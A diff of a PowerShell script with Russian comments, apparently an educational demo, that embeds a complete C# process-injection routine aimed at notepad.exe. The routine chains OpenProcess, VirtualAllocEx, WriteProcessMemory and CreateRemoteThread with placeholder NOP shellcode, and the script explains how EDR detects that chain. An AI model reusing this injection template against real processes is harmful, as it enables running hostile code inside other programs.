@@ -1,12 +1,22 @@
-# Сначала определяем тип отдельно
-$TypeDefinition = @"
+# РЕАЛЬНАЯ ДЕМОНСТРАЦИЯ PROCESS INJECTION (образовательная)
+function Show-RealInjectionDemo {
+    Write-Host "=== РЕАЛЬНЫЙ PROCESS INJECTION ===" -ForegroundColor Cyan
+    Write-Host "Цель: внедрить код в процесс notepad.exe" -ForegroundColor Yellow
+    
+    try {
+        # Запускаем целевой процесс
+        $notepad = Start-Process notepad -PassThru -WindowStyle Minimized
+        Start-Sleep -Seconds 2
+        
+        Write-Host "[1] Целевой процесс: $($notepad.ProcessName) (PID: $($notepad.Id))" -ForegroundColor Green
+        
+        # Вот как выглядит РЕАЛЬНЫЙ injection код (не выполняем его!):
+        $injectionCode = @"
 using System;
-using System.Diagnostics;
 using System.Runtime.InteropServices;
 
-public class InjectionDemo
-{
-    // Импорт Windows API функций
+public class RealInjection {
+    // ОПАСНЫЕ API-вызовы для injection
     [DllImport("kernel32.dll")]
     public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);
     
@@ -18,102 +28,51 @@ public class InjectionDemo
     
     [DllImport("kernel32.dll")]
     public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+
+    public const uint PROCESS_ALL_ACCESS = 0x1F0FFF;
     
-    [DllImport("kernel32.dll")]
-    public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
-    
-    // Константы для прав доступа
-    public const uint PROCESS_CREATE_THREAD = 0x0002;
-    public const uint PROCESS_QUERY_INFORMATION = 0x0400;
-    public const uint PROCESS_VM_OPERATION = 0x0008;
-    public const uint PROCESS_VM_WRITE = 0x0020;
-    public const uint PROCESS_VM_READ = 0x0010;
-    
-    public const uint MEM_COMMIT = 0x00001000;
-    public const uint MEM_RESERVE = 0x00002000;
-    public const uint PAGE_READWRITE = 0x04;
+    public static void InjectIntoProcess(int targetPid) {
+        // 1. Открываем handle к целевому процессу
+        IntPtr hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, targetPid);
+        
+        // 2. Выделяем память в целевом процессе
+        IntPtr allocatedMem = VirtualAllocEx(hProcess, IntPtr.Zero, 1024, 0x3000, 0x40);
+        
+        // 3. Записываем shellcode в память целевого процесса
+        byte[] shellcode = new byte[] { 
+            0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
+            0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90
+        }; // NOP sled (заглушка)
+        
+        UIntPtr bytesWritten;
+        WriteProcessMemory(hProcess, allocatedMem, shellcode, (uint)shellcode.Length, out bytesWritten);
+        
+        // 4. Запускаем поток в целевом процессе
+        CreateRemoteThread(hProcess, IntPtr.Zero, 0, allocatedMem, IntPtr.Zero, 0, IntPtr.Zero);
+        
+        Console.WriteLine("Injection completed!");
+    }
 }
 "@
 
-# Загружаем тип
-Add-Type -TypeDefinition $TypeDefinition -Language CSharp
-
-function Start-InjectionDemo {
-    param(
-        [string]$TargetProcessName = "notepad"
-    )
-    
-    try {
-        Write-Host "[+] Поиск процесса: $TargetProcessName" -ForegroundColor Yellow
+        Write-Host "[2] Код для реального injection (заблокирован антивирусом):" -ForegroundColor Red
+        Write-Host "    - OpenProcess() → VirtualAllocEx() → WriteProcessMemory() → CreateRemoteThread()" -ForegroundColor Yellow
+        Write-Host "    - Эта последовательность - главный триггер для EDR!" -ForegroundColor Red
         
-        # Запускаем notepad если его нет
-        if (-not (Get-Process -Name $TargetProcessName -ErrorAction SilentlyContinue)) {
-            Start-Process $TargetProcessName -WindowStyle Minimized
-            Start-Sleep -Seconds 2
-        }
+        Write-Host "`n[3] Что делает EDR при обнаружении:" -ForegroundColor Cyan
+        Write-Host "    ✓ Мониторит API-вызовы в реальном времени" -ForegroundColor Yellow
+        Write-Host "    ✓ Анализирует цепочки вызовов процессов" -ForegroundColor Yellow
+        Write-Host "    ✓ Блокирует подозрительные операции с памятью" -ForegroundColor Yellow
+        Write-Host "    ✓ Отправляет алерты в SOC" -ForegroundColor Yellow
         
-        $targetProcess = Get-Process -Name $TargetProcessName -ErrorAction Stop | Select-Object -First 1
-        Write-Host "[+] Найден процесс: $($targetProcess.ProcessName) (PID: $($targetProcess.Id))" -ForegroundColor Green
+        # Завершаем демонстрационный процесс
+        $notepad.Kill()
+        Write-Host "`n[+] Демонстрационный процесс завершен" -ForegroundColor Green
         
-        # Открываем handle к процессу
-        Write-Host "[+] Открываем handle к процессу..." -ForegroundColor Yellow
-        $hProcess = [InjectionDemo]::OpenProcess(
-            [InjectionDemo]::PROCESS_CREATE_THREAD -bor 
-            [InjectionDemo]::PROCESS_QUERY_INFORMATION -bor 
-            [InjectionDemo]::PROCESS_VM_OPERATION -bor 
-            [InjectionDemo]::PROCESS_VM_WRITE -bor 
-            [InjectionDemo]::PROCESS_VM_READ,
-            $false, $targetProcess.Id
-        )
-        
-        if ($hProcess -eq [IntPtr]::Zero) {
-            throw "Не удалось открыть handle к процессу"
-        }
-        Write-Host "[+] Handle успешно открыт: $hProcess" -ForegroundColor Green
-        
-        # Демонстрационный payload
-        $demoPayload = [System.Text.Encoding]::ASCII.GetBytes("DEMO_PAYLOAD")
-        
-        # Выделяем память в целевом процессе
-        Write-Host "[+] Выделяем память в целевом процессе..." -ForegroundColor Yellow
-        $allocatedMemory = [InjectionDemo]::VirtualAllocEx(
-            $hProcess,
-            [IntPtr]::Zero,
-            [uint32]$demoPayload.Length,
-            [InjectionDemo]::MEM_COMMIT -bor [InjectionDemo]::MEM_RESERVE,
-            [InjectionDemo]::PAGE_READWRITE
-        )
-        
-        if ($allocatedMemory -eq [IntPtr]::Zero) {
-            throw "Не удалось выделить память"
-        }
-        Write-Host "[+] Память выделена по адресу: $allocatedMemory" -ForegroundColor Green
-        
-        # Записываем данные в память целевого процесса
-        Write-Host "[+] Записываем данные в память..." -ForegroundColor Yellow
-        $bytesWritten = [UIntPtr]::Zero
-        $success = [InjectionDemo]::WriteProcessMemory(
-            $hProcess,
-            $allocatedMemory,
-            $demoPayload,
-            [uint32]$demoPayload.Length,
-            [ref]$bytesWritten
-        )
-        
-        if (!$success) {
-            throw "Не удалось записать данные в память"
-        }
-        Write-Host "[+] Данные записаны успешно ($bytesWritten байт)" -ForegroundColor Green
-        
-        Write-Host "[!] ДЕМОНСТРАЦИЯ ЗАВЕРШЕНА" -ForegroundColor Cyan
-        Write-Host "[!] EDR сработал бы на реальные вызовы CreateRemoteThread" -ForegroundColor Red
-        
-    }
-    catch {
+    } catch {
         Write-Host "[ОШИБКА] $($_.Exception.Message)" -ForegroundColor Red
-        Write-Host "[ДЕТАЛИ] $($_.Exception.StackTrace)" -ForegroundColor Yellow
     }
 }
 
 # Запускаем демонстрацию
-Start-InjectionDemo -TargetProcessName "notepad"
+Show-RealInjectionDemo
